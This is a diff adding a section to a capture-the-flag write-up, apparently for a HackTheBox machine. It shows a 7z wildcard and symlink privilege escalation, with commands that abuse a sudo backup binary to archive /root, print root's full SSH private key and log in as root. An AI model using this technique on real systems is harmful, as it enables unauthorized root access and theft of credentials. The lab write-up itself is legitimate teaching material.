@@ -862,6 +862,10 @@ However, there is nothing particularly interesting or abusable about this.
 
 <br />
 
+# 7z Wildcard Vulnerability:
+
+<br />
+
 ### Project Backup:
 
 <br />
@@ -891,8 +895,114 @@ void backupWebContent(void)
 
 <br />
 
-# 7Z Wilcard Vulnerability:
+Using the wildcard `(*)` in a `7z` command is really dangerous, because if an attacker have `write permissions` in the backup compress path, he can include any `file` of the system.
+
+
+This [page](https://chinnidiwakar.gitbook.io/githubimport/linux-unix/privilege-escalation/wildcards-spare-tricks) explains this concept very well.
+
+First of all, we're going to check if we can write into /var/www/html:
 
 <br />
 
+```bash
+xander@usage:/home$ ls -l /var/www/
+total 4
+drwxrwxrwx 4 root xander 4096 Apr  3  2024 html
+```
+
+<br />
+
+Apparently, we have all `permissions` in this directory.
+
+To exploit this vulnerability, we will create a `symlink` to `/root` directory in `/var/www/html` and run the binary:
+
+<br />
+
+```bash
+xander@usage:~$ cd /var/www/html
+xander@usage:/var/www/html$ ln -s /root root
+xander@usage:/var/www/html$ sudo /usr/bin/usage_management 
+Choose an option:
+1. Project Backup
+2. Backup MySQL data
+3. Reset admin password
+Enter your choice (1/2/3): 1
+
+7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
+p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs AMD EPYC 7513 32-Core Processor                 (A00F11),ASM,AES-NI)
+
+Open archive: /var/backups/project.zip
+--       
+Path = /var/backups/project.zip
+Type = zip
+Physical Size = 54871532
+
+Scanning the drive:
+3185 folders, 18028 files, 132312029 bytes (127 MiB)
+
+Updating archive: /var/backups/project.zip
+
+Items to compress: 21213
+
+                                                                               
+Files read from disk: 18028
+Archive size: 72301603 bytes (69 MiB)
+Everything is Ok
+```
+
+<br />
+
+Finally, we unzip the compressed:
+
+<br />
+
+```bash
+unzip project.zip 
+xander@usage:/tmp/Privesc$ ls
+project_admin  project.zip  root  usage_blog
+```
+
+<br />
+
+And access /root getting the `id_rsa` to connect via `SSH`:
+
+<br />
+
+```bash
+xander@usage:/tmp/Privesc/root$ ls
+cleanup.sh  root.txt  snap  usage_management.c
+xander@usage:/tmp/Privesc/root$ cd .ssh
+xander@usage:/tmp/Privesc/root/.ssh$ cat id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+QyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8Mi
+QgAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3Q
+AAAEC63P+5DvKwuQtE4YOD4IEeqfSPszxqIL1Wx1IT31xsmrbSY6vosAdQzGif553PTtDs
+H2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM=
+-----END OPENSSH PRIVATE KEY-----
+```
+
+<br />
+
+To connect via `SSH` and read the `root.txt` flag:
+
+<br />
+
+```bash
+xander@usage:/tmp/Privesc/root/.ssh$ ssh -i id_rsa root@localhost
+The authenticity of host 'localhost (127.0.0.1)' can't be established.
+ED25519 key fingerprint is SHA256:4YfMBkXQJGnXxsf0IOhuOJ1kZ5c1fOLmoOGI70R/mws.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'localhost' (ED25519) to the list of known hosts.
+Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-101-generic x86_64)
+...[snip]...
+Last login: Mon Apr  8 13:17:47 2024 from 10.10.14.40
+root@usage:~# id
+uid=0(root) gid=0(root) groups=0(root)
+root@usage:~# cat root.txt
+0e4900d1fcce6c03c23a7dbea4xxxxxx
+```
+
+<br />
 
